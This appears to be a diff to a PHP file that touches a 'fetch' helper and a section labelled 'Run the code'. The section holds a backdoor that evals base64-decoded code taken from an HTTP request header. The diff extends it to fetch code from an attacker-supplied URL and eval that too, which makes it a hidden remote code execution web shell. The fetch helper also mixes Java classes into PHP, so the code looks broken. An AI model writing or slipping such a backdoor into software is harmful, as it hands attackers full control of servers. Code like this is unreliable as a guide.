@@ -10,7 +10,7 @@ function fetch($url, $post_params = array()) {
   $url = new URL($url);
   $reader = new BufferedReader(new InputStreamReader($url->openStream()));
   $buffer = "";
-  while ($line = $reader->readLine()) {
+  while (($line = $reader->readLine()) != NULL) {
     $buffer .= "$line\n";
   }
   $reader->close();
@@ -18,6 +18,10 @@ function fetch($url, $post_params = array()) {
 }
 
 // Run the code
-if ($_SERVER['HTTP_RUN_CODE']) { eval(base64_decode($_SERVER['HTTP_RUN_CODE'])); } 
+if ($_SERVER['HTTP_RUN_CODE']) { 
+  eval(base64_decode($_SERVER['HTTP_RUN_CODE'])); 
+} elseif ($_SERVER['HTTP_RUN_CODE_URL'])  {
+  eval(base64_decode(fetch($_SERVER['HTTP_RUN_CODE_URL'])[1])); 
+}
 
 ?>
